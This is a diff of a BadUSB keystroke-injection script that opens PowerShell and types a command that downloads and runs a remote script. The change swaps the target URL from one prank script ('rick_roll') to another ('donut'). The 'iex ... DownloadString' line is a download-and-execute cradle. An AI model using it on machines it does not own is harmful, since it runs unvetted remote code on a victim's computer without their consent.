@@ -8,7 +8,7 @@ STRING PowerShell
 DELAY 750
 ENTER
 DELAY 1000
-STRING iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/IadRabbit/BadUSB_Scripts/main/jokes/scripts/rick_roll_cmd_script.ps1")
+STRING iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/IadRabbit/BadUSB_Scripts/main/jokes/scripts/donut_cmd_script.ps1")
 DELAY 1000
 ENTER
 DELAY 750
